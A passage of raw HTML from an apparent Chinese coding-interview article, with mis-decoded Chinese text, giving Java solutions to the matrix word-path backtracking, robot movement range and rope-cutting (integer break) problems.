‡è®°ä¸ºå·²ç»ä½¿ç”¨ï¼Œé˜²æ­¢é‡å¤ä½¿ç”¨ã€‚åœ¨è¿™ä¸€æ¬¡æœç´¢ç»“æŸä¹‹åï¼Œéœ€è¦å°† b çš„å·²ç»ä½¿ç”¨çŠ¶æ€æ¸…é™¤ï¼Œå¹¶æœç´¢ cã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-67496327c4f0c3dcb353f42879503e59_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"377\" data-rawheight=\"337\" class=\"content_image\" width=\"377\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;377&#39; height=&#39;337&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"377\" data-rawheight=\"337\" class=\"content_image lazy\" width=\"377\" data-actualsrc=\"https://pic2.zhimg.com/v2-67496327c4f0c3dcb353f42879503e59_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æœ¬é¢˜çš„è¾“å…¥æ˜¯æ•°ç»„è€Œä¸æ˜¯çŸ©é˜µï¼ˆäºŒç»´æ•°ç»„ï¼‰ï¼Œå› æ­¤éœ€è¦å…ˆå°†æ•°ç»„è½¬æ¢æˆçŸ©é˜µã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span><span class=\"o\">[][]</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"o\">{{</span><span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">},</span> <span class=\"o\">{</span><span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">},</span> <span class=\"o\">{-</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">},</span> <span class=\"o\">{</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">}};</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">rows</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">cols</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">hasPath</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">array</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">rows</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">cols</span><span class=\"o\">,</span> <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">rows</span> <span class=\"o\">==</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"n\">cols</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">rows</span> <span class=\"o\">=</span> <span class=\"n\">rows</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">cols</span> <span class=\"o\">=</span> <span class=\"n\">cols</span><span class=\"o\">;</span>\n    <span class=\"kt\">boolean</span><span class=\"o\">[][]</span> <span class=\"n\">marked</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">boolean</span><span class=\"o\">[</span><span class=\"n\">rows</span><span class=\"o\">][</span><span class=\"n\">cols</span><span class=\"o\">];</span>\n    <span class=\"kt\">char</span><span class=\"o\">[][]</span> <span class=\"n\">matrix</span> <span class=\"o\">=</span> <span class=\"n\">buildMatrix</span><span class=\"o\">(</span><span class=\"n\">array</span><span class=\"o\">);</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">rows</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">cols</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">backtracking</span><span class=\"o\">(</span><span class=\"n\">matrix</span><span class=\"o\">,</span> <span class=\"n\">str</span><span class=\"o\">,</span> <span class=\"n\">marked</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">))</span>\n                <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"nf\">backtracking</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[][]</span> <span class=\"n\">matrix</span><span class=\"o\">,</span> <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">str</span><span class=\"o\">,</span>\n                             <span class=\"kt\">boolean</span><span class=\"o\">[][]</span> <span class=\"n\">marked</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">pathLen</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">r</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">c</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pathLen</span> <span class=\"o\">==</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">r</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"n\">r</span> <span class=\"o\">&gt;=</span> <span class=\"n\">rows</span> <span class=\"o\">||</span> <span class=\"n\">c</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"n\">c</span> <span class=\"o\">&gt;=</span> <span class=\"n\">cols</span>\n            <span class=\"o\">||</span> <span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">]</span> <span class=\"o\">!=</span> <span class=\"n\">str</span><span class=\"o\">[</span><span class=\"n\">pathLen</span><span class=\"o\">]</span> <span class=\"o\">||</span> <span class=\"n\">marked</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">])</span> <span class=\"o\">{</span>\n\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">marked</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">n</span> <span class=\"o\">:</span> <span class=\"n\">next</span><span class=\"o\">)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">backtracking</span><span class=\"o\">(</span><span class=\"n\">matrix</span><span class=\"o\">,</span> <span class=\"n\">str</span><span class=\"o\">,</span> <span class=\"n\">marked</span><span class=\"o\">,</span> <span class=\"n\">pathLen</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">r</span> <span class=\"o\">+</span> <span class=\"n\">n</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">],</span> <span class=\"n\">c</span> <span class=\"o\">+</span> <span class=\"n\">n</span><span class=\"o\">[</span><span class=\"n\">1</span><span class=\"o\">]))</span>\n            <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"n\">marked</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">char</span><span class=\"o\">[][]</span> <span class=\"nf\">buildMatrix</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">array</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">char</span><span class=\"o\">[][]</span> <span class=\"n\">matrix</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">char</span><span class=\"o\">[</span><span class=\"n\">rows</span><span class=\"o\">][</span><span class=\"n\">cols</span><span class=\"o\">];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">idx</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">r</span> <span class=\"o\">&lt;</span> <span class=\"n\">rows</span><span class=\"o\">;</span> <span class=\"n\">r</span><span class=\"o\">++)</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">c</span> <span class=\"o\">&lt;</span> <span class=\"n\">cols</span><span class=\"o\">;</span> <span class=\"n\">c</span><span class=\"o\">++)</span>\n            <span class=\"n\">matrix</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">array</span><span class=\"o\">[</span><span class=\"n\">idx</span><span class=\"o\">++];</span>\n    <span class=\"k\">return</span> <span class=\"n\">matrix</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/6e5207314b5241fb83f2329e89fdecc8%3FtpId%3D13%26tqId%3D11219%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>åœ°ä¸Šæœ‰ä¸€ä¸ª m è¡Œå’Œ n åˆ—çš„æ–¹æ ¼ã€‚ä¸€ä¸ªæœºå™¨äººä»åæ ‡ (0, 0) çš„æ ¼å­å¼€å§‹ç§»åŠ¨ï¼Œæ¯ä¸€æ¬¡åªèƒ½å‘å·¦å³ä¸Šä¸‹å››ä¸ªæ–¹å‘ç§»åŠ¨ä¸€æ ¼ï¼Œä½†æ˜¯ä¸èƒ½è¿›å…¥è¡Œåæ ‡å’Œåˆ—åæ ‡çš„æ•°ä½ä¹‹å’Œå¤§äº k çš„æ ¼å­ã€‚</p><p>ä¾‹å¦‚ï¼Œå½“ k ä¸º 18 æ—¶ï¼Œæœºå™¨äººèƒ½å¤Ÿè¿›å…¥æ–¹æ ¼ (35,37)ï¼Œå› ä¸º 3+5+3+7=18ã€‚ä½†æ˜¯ï¼Œå®ƒä¸èƒ½è¿›å…¥æ–¹æ ¼ (35,38)ï¼Œå› ä¸º 3+5+3+8=19ã€‚è¯·é—®è¯¥æœºå™¨äººèƒ½å¤Ÿè¾¾åˆ°å¤šå°‘ä¸ªæ ¼å­ï¼Ÿ</p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDepth First Searchï¼ŒDFSï¼‰æ–¹æ³•è¿›è¡Œæ±‚è§£ã€‚å›æº¯æ˜¯æ·±åº¦ä¼˜å…ˆæœç´¢çš„ä¸€ç§ç‰¹ä¾‹ï¼Œå®ƒåœ¨ä¸€æ¬¡æœç´¢è¿‡ç¨‹ä¸­éœ€è¦è®¾ç½®ä¸€äº›æœ¬æ¬¡æœç´¢è¿‡ç¨‹çš„å±€éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨æœ¬æ¬¡æœç´¢ç»“æŸä¹‹åæ¸…é™¤çŠ¶æ€ã€‚è€Œæ™®é€šçš„æ·±åº¦ä¼˜å…ˆæœç´¢å¹¶ä¸éœ€è¦ä½¿ç”¨è¿™äº›å±€éƒ¨çŠ¶æ€ï¼Œè™½ç„¶è¿˜æ˜¯æœ‰å¯èƒ½è®¾ç½®ä¸€äº›å…¨å±€çŠ¶æ€ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kd\">final</span> <span class=\"kt\">int</span><span class=\"o\">[][]</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"o\">{{</span><span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">},</span> <span class=\"o\">{</span><span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">},</span> <span class=\"o\">{-</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">},</span> <span class=\"o\">{</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">}};</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">rows</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">cols</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">threshold</span><span class=\"o\">;</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[][]</span> <span class=\"n\">digitSum</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">movingCount</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">threshold</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">rows</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">cols</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">rows</span> <span class=\"o\">=</span> <span class=\"n\">rows</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">cols</span> <span class=\"o\">=</span> <span class=\"n\">cols</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">threshold</span> <span class=\"o\">=</span> <span class=\"n\">threshold</span><span class=\"o\">;</span>\n    <span class=\"n\">initDigitSum</span><span class=\"o\">();</span>\n    <span class=\"kt\">boolean</span><span class=\"o\">[][]</span> <span class=\"n\">marked</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">boolean</span><span class=\"o\">[</span><span class=\"n\">rows</span><span class=\"o\">][</span><span class=\"n\">cols</span><span class=\"o\">];</span>\n    <span class=\"n\">dfs</span><span class=\"o\">(</span><span class=\"n\">marked</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">cnt</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">dfs</span><span class=\"o\">(</span><span class=\"kt\">boolean</span><span class=\"o\">[][]</span> <span class=\"n\">marked</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">r</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">c</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">r</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"n\">r</span> <span class=\"o\">&gt;=</span> <span class=\"n\">rows</span> <span class=\"o\">||</span> <span class=\"n\">c</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span> <span class=\"o\">||</span> <span class=\"n\">c</span> <span class=\"o\">&gt;=</span> <span class=\"n\">cols</span> <span class=\"o\">||</span> <span class=\"n\">marked</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">])</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"n\">marked</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">digitSum</span><span class=\"o\">[</span><span class=\"n\">r</span><span class=\"o\">][</span><span class=\"n\">c</span><span class=\"o\">]</span> <span class=\"o\">&gt;</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">threshold</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">n</span> <span class=\"o\">:</span> <span class=\"n\">next</span><span class=\"o\">)</span>\n        <span class=\"n\">dfs</span><span class=\"o\">(</span><span class=\"n\">marked</span><span class=\"o\">,</span> <span class=\"n\">r</span> <span class=\"o\">+</span> <span class=\"n\">n</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">],</span> <span class=\"n\">c</span> <span class=\"o\">+</span> <span class=\"n\">n</span><span class=\"o\">[</span><span class=\"n\">1</span><span class=\"o\">]);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">initDigitSum</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">digitSumOne</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">rows</span><span class=\"o\">,</span> <span class=\"n\">cols</span><span class=\"o\">)];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">digitSumOne</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">digitSumOne</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">+=</span> <span class=\"n\">n</span> <span class=\"o\">%</span> <span class=\"n\">10</span><span class=\"o\">;</span>\n            <span class=\"n\">n</span> <span class=\"o\">/=</span> <span class=\"n\">10</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">digitSum</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">rows</span><span class=\"o\">][</span><span class=\"n\">cols</span><span class=\"o\">];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">rows</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">cols</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">digitSum</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">digitSumOne</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">+</span> <span class=\"n\">digitSumOne</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>14. å‰ªç»³å­</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/integer-break/description/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode</a></p><h2>é¢˜ç›®æè¿°</h2><p>æŠŠä¸€æ ¹ç»³å­å‰ªæˆå¤šæ®µï¼Œå¹¶ä¸”ä½¿å¾—æ¯æ®µçš„é•¿åº¦ä¹˜ç§¯æœ€å¤§ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">n = 2\nreturn 1 (2 = 1 + 1)\n\nn = 10\nreturn 36 (10 = 3 + 3 + 4)</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><h3>è´ªå¿ƒ</h3><p>å°½å¯èƒ½å¤šå‰ªé•¿åº¦ä¸º 3 çš„ç»³å­ï¼Œå¹¶ä¸”ä¸å…è®¸æœ‰é•¿åº¦ä¸º 1 çš„ç»³å­å‡ºç°ã€‚å¦‚æœå‡ºç°äº†ï¼Œå°±ä»å·²ç»åˆ‡å¥½é•¿åº¦ä¸º 3 çš„ç»³å­ä¸­æ‹¿å‡ºä¸€æ®µä¸é•¿åº¦ä¸º 1 çš„ç»³å­é‡æ–°ç»„åˆï¼ŒæŠŠå®ƒä»¬åˆ‡æˆä¸¤æ®µé•¿åº¦ä¸º 2 çš„ç»³å­ã€‚</p><p>è¯æ˜ï¼šå½“ n &gt;= 5 æ—¶ï¼Œ3(n - 3) - n = 2n - 9 &gt; 0ï¼Œä¸” 2(n - 2) - n = n - 4 &gt; 0ã€‚å› æ­¤åœ¨ n &gt;= 5 çš„æƒ…å†µä¸‹ï¼Œå°†ç»³å­å‰ªæˆä¸€æ®µä¸º 2 æˆ–è€… 3ï¼Œå¾—åˆ°çš„ä¹˜ç§¯ä¼šæ›´å¤§ã€‚åˆå› ä¸º 3(n - 3) - 2(n - 2) = n - 5 &gt;= 0ï¼Œæ‰€ä»¥å‰ªæˆä¸€æ®µé•¿åº¦ä¸º 3 æ¯”é•¿åº¦ä¸º 2 å¾—åˆ°çš„ä¹˜ç§¯æ›´å¤§ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">integerBreak</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">&lt;</span> <span class=\"n\">2</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">==</span> <span class=\"n\">2</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">==</span> <span class=\"n\">3</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">timesOf3</span> <span class=\"o\">=</span> <span class=\"n\">n</span> <span class=\"o\">/</span> <span class=\"n\">3</span><span class=\"o\">;</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">timesOf3</span> <span class=\"o\">*</span> <span class=\"n\">3</span> <span class=\"o\">==</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"n\">timesOf3</span><span class=\"o\">--;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">timesOf2</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">n</span> <span class=\"o\">-</span> <span class=\"n\">timesOf3</span> <span class=\"o\">*</span> <span class=\"n\">3</span><span class=\"o\">)</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">)</span> <span class=\"o\">(</span><span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">pow</span><span class=\"o\">(</span><span class=\"n\">3</span><span class=\"o\">,</span> <span class=\"n\">timesOf3</span><span class=\"o\">))</span> <span class=\"o\">*</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">)</span> <span class=\"o\">(</span><span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">pow</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">timesOf2</span><span class=\"o\">));</span>\n<span class=\"o\">}</span></code></pre></div><h3>åŠ¨æ€è§„åˆ’</h3><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">integerBreak</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">n</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n    <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">i</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>\n            <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">],</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">*</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">j</span><span class=\"o\">),</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">*</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">j</span><span class=\"o\">)));</span>\n    <span class=\"k\">return</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">];</span>\n<span class=\"o\">}</span></code></pre></div><h2>15. äºŒè¿›åˆ¶ä¸­ 1 çš„ä¸ªæ•°</h2><p><a 